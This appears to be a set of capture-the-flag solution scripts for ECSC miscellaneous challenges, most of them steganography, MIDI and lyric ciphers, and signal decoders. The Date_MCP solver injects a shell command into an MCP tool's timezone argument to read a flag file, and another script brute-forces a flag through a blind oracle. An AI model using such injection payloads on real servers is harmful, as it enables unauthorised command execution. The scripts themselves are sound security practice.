                exploit = self.exploit_development(i, letter)
                # print(f"[+] Trying: {exploit}")
                response = self.sending_request(exploit=exploit)
                if response and "result" in response:
                    try:
                        result = int(response["result"])
                        if result == 1:
                            print(
                                f"[+] Found character at position {i}: {letter}. Flag so far: {self.flag + letter}"
                            )
                            self.flag += letter
                            break
                        else:
                            print(f"[-] Character at position {i} is not: {letter}")
                    except ValueError:
                        print("[-] Failed to parse response.")
                else:
                    print("[-] No valid response received.")

        print(f"[+] Final flag: {self.flag}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def validate_flag(self):
        for i, letter in enumerate(self.flag):
            exploit = self.exploit_development(i, letter)
            print(f"[+] Trying: {letter}")
            response = self.sending_request(exploit=exploit)
            if response and "result" in response:
                try:
                    result = int(response["result"])
                    if result == 0:
                        print(f"[-] Flag is invalid at position {i}: {letter}")
                        return False
                except ValueError:
                    print("[-] Failed to parse response.")
                    return False
            else:
                print("[-] No valid response received.")
                return False
        print("[+] Flag is valid!")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/InitialChallenge/payloads/solution.py
    def main(self):
        image = self.folfil("files", "qo91ni.jpg")
        img = Image.open(image)
        r, g, b = img.split()
        r_lsb = np.array(r) & 1
        g_lsb = np.array(g) & 1
        b_lsb = np.array(b) & 1
        combined = (r_lsb << 2) | (g_lsb << 1) | b_lsb
        Image.fromarray((combined * 32).astype(np.uint8)).show()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def bruteforcing_failed(self):
        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        flag = []
        all_letters = ascii_letters + punctuation
        for i in self.KEY:
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag.append(all_letters[(i) % len(all_letters)])
        self.flag = "".join(flag)
        print(self.flag)
        # print(ascii_letters)
        print(all_letters)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def main(self):

        # self.bruteforcing_failed()
        # return
        self.music21_analysis()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_analysis(self):
        # midi_file_path = "/mnt/data/flag.midi"
        self.midi = converter.parse(self.challenge_file)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_note_analysis(self):
        # Analyze structure and extract textual representation
        notes_data = []
        for element in self.midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(".".join(str(n) for n in element.normalOrder))

        return

        analysis = []

        for i, element in enumerate(notes_data):
            split_element = element.split(" ")
            if "." in split_element[0]:
                analysis.append(
                    {
                        "sort": i,
                        "type": split_element[0].split(".")[1],
                        "value": " ".join(split_element[1:]),
                    }
                )
            else:
                analysis.append({"sort": i, "type": "generic", "value": element})

        with open(self.folfil("data", "analysis_music_21.json"), "w") as f:
            import json

            json.dump(analysis, f, indent=4)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_functions(self, variable, under=False):
        """
        Get all functions of a variable
        """

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith("__")))
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_attributes(self, variable):
        """
        Get all attributes of a variable
        """

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith("__"))
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_instruments(self):
        """
        Returns a list of instruments in the MIDI file.
        """

        for instrument in self.midi_data.instruments:
            print(instrument)
        return self.midi_data.instruments

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def main(self):
        self.init_some_values()
        self.midi_data = pretty_midi.PrettyMIDI(self.challenge_file.as_posix())
        instruments = self.midi_data.instruments

        piano = instruments[1]
        notes = [note.pitch for note in piano.notes]

        chosen = [notes[c] for c in self.key]

        flag = "".join([chr(c) for c in chosen])

        flag = flag[:4] + "{" + flag[4:] + "}"
        print("Flag:", flag)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def load_lyrics(self):

        files = [
            "lyrics_partial.txt",
            "lyrics.txt",
            "greek_lyrics.txt",
            "genius_lyrics.txt",
        ]

        with open(self.folfil("data", files[1]), "r") as f:
            lyrics = f.read().strip()
        return lyrics

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def dictionary_analysis(self, lyrics):
        d = defaultdict(list)
        for i, c in enumerate(lyrics):
            d[c].append(i)
        return d

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def print_dictionary(self, d):
        sorted_items = sorted(d.items(), key=lambda x: x[0])
        for key, value in sorted_items:
            print(f"{key}: {value}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transpose(self, lyrics, offset, wrap=True):
        if offset > len(lyrics):
            offset = offset % len(lyrics)

        result = lyrics[offset:]
        if wrap:
            result += lyrics[:offset]

        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transformation(self, lyrics):

        punctuation_used = set()
        for c in lyrics:
            if c not in ascii_letters + digits + " ":
                punctuation_used.add(c)

        lyrics_only_letters = "".join([c for c in lyrics if c.isalnum()])
        lyrics_with_spaces = lyrics.replace("\n", " ")
        lyrics_without_punctuation = lyrics_with_spaces.replace("'", "").replace(
            ",", ""
        )
        return lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_all(self):
        """
        Description:
            This function generates all possible combinations of lyrics transformations
            based on the provided replace_combos and control_combos.
            It uses itertools.product to create combinations of the specified number
            of transformations, allowing for flexible lyric manipulation.
        Returns:
            list: A list of transformed lyrics combinations.
        """
        lyrics = self.load_lyrics()
        control_combos = self.creating_control_combos(
            start=0, end=1, number=len(self.replace_combos)
        )
        return [
            self.lyrics_transformation(lyrics, self.replace_combos, control)
            for control in control_combos
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def creating_control_combos(self, start=0, end=1, number=8):
        if start >= end:
            raise ValueError("Start must be less than end.")
        if number < 1:
            raise ValueError("Number of combinations must be at least 1.")
        return list(itertools.product(range(start, end + 1), repeat=number))

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_transformation(self, lyrics, replace_combos, control_combos=None):
        if control_combos is None:
            return lyrics

        for control, combo in zip(control_combos, replace_combos):
            if control:
                if len(combo[0]) > 1:
                    lyrics = lyrics.replace(*combo[0]).replace(*combo[1])
                else:
                    lyrics = lyrics.replace(*combo)
        return lyrics

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def brute_transpose_find_flag(
        self,
        lyrics: str,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        """
        Description:
            For the lyrics given

        Args:
            lyrics (str): Lyrics given
            partial_flag (str): partial flag to look
            verbose (bool, optional): _description_. Defaults to False.

        Returns:
            str: possible flag
        """

        for i in range(len(lyrics)):
            transposed = self.lyric_transpose(lyrics, i, wrap=wrap)
            if verbose and i % 100 == 0:
                print(f"Trying offset: {i}")
            temp_flag = self.position_cipher(transposed, keys)
            if "ecsc" in temp_flag.lower() or self.check_for_rot(
                temp_flag, partial_flag
            ):
                print(f"Found flag: {temp_flag} - Offset: {i}")
                return temp_flag

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def check_for_rot(self, text, partial="ecsc"):
        """
        Description:
            Checks if the text is a rotation of "ecsc".
            This function checks if the first four characters of the text
            can be rearranged to form the string "ecsc". It does this by
            comparing the ASCII values of the characters in the text with
            the ASCII values of the characters in "ecsc". If the conditions
            are met, it returns True, indicating that the text is a rotation
            of "ecsc". Otherwise, it returns False.
            This function is useful for identifying specific patterns in the text
            that match the structure of "ecsc", which could be relevant in certain

            Challenge_specific
        Args:
            text (_type_): _description_

        Returns:
            _type_: _description_
        """

        if len(partial) != 4:
            raise ValueError(
                "Partial must be exactly 4 characters long. Challenge_specific"
            )
        text = text.lower()

        check1 = (ord(partial[0]) - ord(partial[1])) == (ord(text[0]) - ord(text[1]))
        check2 = (ord(partial[2]) - ord(partial[1])) == (ord(text[2]) - ord(text[1]))
        check3 = ord(text[3]) == ord(text[1])

        return check1 and check2 and check3

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def position_cipher(self, text: str, keys: list):
        """
        Description:
            This function takes a text and a list of keys, and returns a new string
            where each character in the text is replaced by the character at the
            corresponding index in the keys list. If the index exceeds the length of
            the text, it wraps around using modulo operation.
        Args:
            text (str): The input text to be transformed.
            keys (list): A list of integers representing the positions in the text.
        Returns:
            str: A new string formed by replacing characters in the text based on the keys.
        """

        return "".join(text[i % len(text)] for i in keys)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def bruteforce_all_lyrics(
        self,
        all_lyrics: list,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        results = []
        for lyric_i, lyrics in enumerate(all_lyrics):
            if verbose:
                print(f"Processing lyrics {lyric_i + 1}/{len(all_lyrics)}")
            result = self.brute_transpose_find_flag(
                lyrics=lyrics,
                partial_flag=partial_flag,
                keys=keys,
                verbose=verbose,
                wrap=wrap,
            )
            if result:
                results.append([lyric_i, result])

        return results

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

        self.replace_combos = [
            (" ", ""),
            (",", " "),
            ((",", " "), ("'", " ")),
            ((",", ""), ("'", "")),
            (",", ""),
            ("'", " "),
            ("'", ""),
            ("\n", " "),
            ("\n", ""),
        ]

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def another_attempt(self):

        lyrics = self.load_lyrics()

        lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation = (
            self.lyric_transformation(lyrics)
        )

        print(lyrics_only_letters)
        print(lyrics_with_spaces)
        print(lyrics_without_punctuation)

        # flag = self.bruteforce(lyrics, self.key)
        # print(flag)
        # flag = self.bruteforce(lyrics_only_letters, self.key)
        # print(flag)
        flag = self.brute_transpose_find_flag(lyrics_with_spaces, self.key)
        print(flag)
        flag = self.brute_transpose_find_flag(lyrics_without_punctuation, self.key)
        print(flag)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def main(self):

        self.init_some_values()

        all_lyrics = self.lyrics_all()

        partial_flag = "ecsc"

        results = self.bruteforce_all_lyrics(
            all_lyrics, partial_flag, keys=self.key, verbose=True, wrap=True
        )
        if results:
            for lyric_i, result in results:
                print(f"Lyric {lyric_i + 1}: {result}")
        else:
            print("No results found.")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def bruteforcing_failed(self):

        flag = ""
        for i in range(len(self.KEY)):
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag += ascii_letters[(self.KEY[i]) % len(ascii_letters)]
        self.flag = flag

        print(self.flag)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def main(self):

        # variables = "MThdMTrk"
        # variables = "MTrk"

        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        self.music21_analysis()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def music21_analysis(self):
        # midi_file_path = "/mnt/data/flag.midi"
        midi = converter.parse(self.challenge_file)

        # Analyze structure and extract textual representation
        notes_data = []
        for element in midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(".".join(str(n) for n in element.normalOrder))

        # Show first 50 note/chord representations
        with open(self.folfil("data", "analysis_music_21.json"), "w") as f:
            import json

            json.dump(notes_data, f, indent=4)
        print(notes_data)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_send(
        self,
        text,
        lines=None,
        text_until=None,
        display=False,
        save=False,
        ansi_escape=False,
    ):
        """
        Description:
            Receives lines and sends a response.
            It can receive a number or lines, and/or specific text.
            If save is True, it saves the output of the menu in a list and returns it.
            If display is True, it prints the output of everything received.

        Args:
            choice (int or str): Choice to send to the menu
            menu_num (int, optional): Number of options printed in the menu. Defaults to None.
            menu_text (str, optional): Text that the menu asks before sending your choice. Defaults to None.
            display (bool, optional): Variable to print every received line. Defaults to False.
            save (bool, optional): . Defaults to False.
        Returns:
            list: List of output of the menu if save is True
        """
        if save:
            result = []

        if lines is None:
            lines = 0

        out_lines = self.recv_lines(number=lines, display=display, save=save)

        if save:
            result.extend(out_lines)

        if text_until:
            out_text_until = self.recv_until(text=text_until, ansi_escape=ansi_escape)

        if ansi_escape:
            out_text_until = self.extract_printable_with_spaces(
                out_text_until.decode("utf-8")
            )

        if save:
            result.append(out_text_until)

        if display:
            print(out_text_until)

        self.send(text)

        if save:
            return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_until(self, text, **kwargs) -> bytes:
        """
        Description:
            Receive data until one of `delims`(text) provided is encountered. It encodes the text before sending it.
            Wrapper for self.conn.recvuntil(text.encode())
            Can also drop the ending if drop is True. If the request is not satisfied before ``timeout`` seconds pass, all data is buffered and an empty string (``''``) is returned.
        Args:
            text (str): Text to receive until
            **kwargs: Additional keyword arguments to pass to the recv
                - drop (bool, optional): Drop the ending.  If :const:`True` it is removed from the end of the return value. Defaults to False.
                - timeout (int, optional): Timeout in seconds. Defaults to default.

        Raises:
            exceptions.EOFError: The connection closed before the request could be satisfied

        Returns:
            A string containing bytes received from the socket,
            or ``''`` if a timeout occurred while waiting.

        """

        # Handles the connection closed before the request could be satisfied
        if kwargs.get("ansi_escape", False):
            text = self.simulate_ansi_typing(text, escape_codes=False)
        kwargs = {k: v for k, v in kwargs.items() if k not in ["ansi_escape"]}
        try:
            return self.conn.recvuntil(text.encode(), **kwargs)
        except EOFError:
            print("Connection closed before the request could be satisfied")
            return b""

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def get_welcome_message(self):
        self.recv_lines(2)
        time.sleep(0.5)
        self.recv_lines(4)
        time.sleep(0.5)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def extract_printable_with_spaces(self, text):
        # Remove ANSI escape sequences (e.g., \x1b[?25l, \x1b[?25h, \x1b[K, \x1b[1C, etc.)
        # ansi_escape = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
        # ansi_escape = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
        ansi_escape = re.compile(r"\x1b\[.*?[@-~]")
        cleaned = ansi_escape.sub("", text)

        return cleaned

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def simulate_ansi_typing(self, text, escape_codes=True):
        result = ""
        for char in text:
            if char == " ":
                # Simulate clearing and moving cursor for space too
                result += "\x1b[?25l\x1b[K\x1b[1C\x1b[?25h"
            else:
                result += f"\x1b[?25l{char}\x1b[?25h"
        # result += "\n"  # Optional: simulate Enter
        if escape_codes:
            # Add ANSI escape codes to simulate typing
            return repr(result)
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_round(self):
        time.sleep(1)
        choice = [1, 2][0]
        # Get the visible number
        visible_number = self.recv_lines(1, save=True)[0]
        # print(visible_number)
        print(self.extract_printable_with_spaces(visible_number.decode("utf-8")))
        # visible_number = int(visible_number.split()[-1])
        # User choice
        # text_until = self.simulate_ansi_typing("> ")
        text_until = "> "
        # out = self.recv_send(
        #     text_until=text_until,
        #     lines=5,
        #     text=choice,
        #     display=True,
        #     save=True,
        # )
        out = self.recv_lines(6, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode("utf-8")))

        out = self.recv_until(text=text_until, ansi_escape=False)
        # print(out)
        self.send(choice)
        # for line in out:
        #     print(self.extract_printable_with_spaces(line.decode("utf-8")))
        out = self.recv_lines(2, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode("utf-8")))

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_game(self):
        self.choice_text = "The number on the table is "
        self.initiate_connection()
        self.get_welcome_message()

        # Some kind of loop probably
        self.play_round()

        round_result = self.recv_lines(1, save=True)[0]
        print(round_result)
        if "10/10" in round_result:
            self.recv_lines(3, display=True)

        self.conn.close()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def testing_ansii_escape(self):
        # self.play_game()

        text_until = self.simulate_ansi_typing("> ")
        print(text_until)
        phrase = b"The number on the table is 31"
        print(f"Simulating typing: {phrase}")
        simulated_typing = self.simulate_ansi_typing(phrase)
        print(f"Simulated typing output: {simulated_typing}")

        encoded = "\x1b[?25lT\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25lu\x1b[?25h\x1b[?25lm\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25lr\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lo\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25la\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25ll\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25li\x1b[?25h\x1b[?25ls\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25l3\x1b[?25h\x1b[?25l1\x1b[?25h\n"

        print(f"Encoded output: {encoded}")
        # Simulate sending the encoded string
        encoded = self.extract_printable_with_spaces(encoded)
        print(f"Extracted printable output: {encoded}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def main(self):
        self.play_game()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def initialize_values(self):
        # 2) Initialize MCP
        self.init = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {
                    "name": "challenge_solution",
                    "version": "1.0",
                },
            },
        }
        self.base_url = f"http://{self.url}:{self.port}"
        self.sse_url = f"{self.base_url}/sse"

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_request(self):
        self.session = requests.Session()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_sse(self, sse_url):
        self.messages = SSEClient(sse_url, session=self.session)
        first = next(self.messages).data
        m = re.search(r"session_id=([a-f0-9]+)", first)
        if not m:
            raise SystemExit("❌ Couldn't get session_id")
        self.sid = m.group(1)
        self.post_url = f"{self.base_url}/messages/?session_id={self.sid}"

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def exploit(self):
        # 3) Exploit: call get_current_time with injection
        # Note: no literal spaces allowed, so we use ${IFS} to stand in for a space.
        injection = 'Europe/Athens";cat${IFS}flag.txt;#'
        cat_call = {
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {"name": "get_current_time", "arguments": {"tz": injection}},
        }

        self.session.post(self.post_url, json=cat_call)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def tools_result(self):
        # 4) Listen for the tool’s result (either an "id":2 result or a tools/result notification)
        for msg in self.messages:
            try:
                pkt = json.loads(msg.data)
            except json.JSONDecodeError:
                continue

            # Case A: direct JSON-RPC reply
            if pkt.get("id") == 2 and "result" in pkt:
                out = pkt["result"]
            # Case B: a tools/result notification
            elif (
                pkt.get("method") == "tools/result"
                and pkt.get("params", {}).get("id") == 2
            ):
                out = pkt["params"]["result"]
            else:
                continue

            # out might be a string or a more structured object.
            text = out if isinstance(out, str) else json.dumps(out)

            # Search for our ECSC flag
            m2 = re.search(r"(ECSC\{.*?\})", text)
            if m2:
                flag = m2.group(1)
                print("Flag found:", flag)
            else:
                print("No flag in tool output. Raw output:")
                print(text)
            break
        return flag

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def interacting_with_mcp(self):
        self.session.post(self.post_url, json=self.init)
        # wait for init reply
        for msg in self.messages:
            data = json.loads(msg.data)
            if data.get("id") == 1:
                # send initialized notification
                self.session.post(
                    self.post_url,
                    json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                )
            break

        self.exploit()
        flag = self.tools_result()
        if flag:
            print(f"Flag: {flag}")
        else:
            print("❌ Flag not found")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def main(self):
        self.initialize_values()
        self.setup_request()
        self.setup_sse(self.sse_url)
        self.interacting_with_mcp()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "requests.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "requests.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/requests.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_nrzi(self, encoded_bits):
        """
        Decode a NRZ-I encoded bit string to ASCII.
        NRZ-I: A '1' means a transition, '0' means no transition.
        The first bit is assumed to be the initial signal level (0 or 1).
        """
        # Convert string to list of ints
        bits = list(map(int, encoded_bits))
        decoded_bits = []
        # Initial signal level
        current_level = bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(bits)):
            if bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def main(self):

        self.requests = []

        # text = "011011101110000100111001000010010011111011110000"
        # decoded = self.decode_nrzi(text)

        # text = "100110010110101000011000111110011000101010"
        # decoded = self.decode_hamming74(text)
        # # return

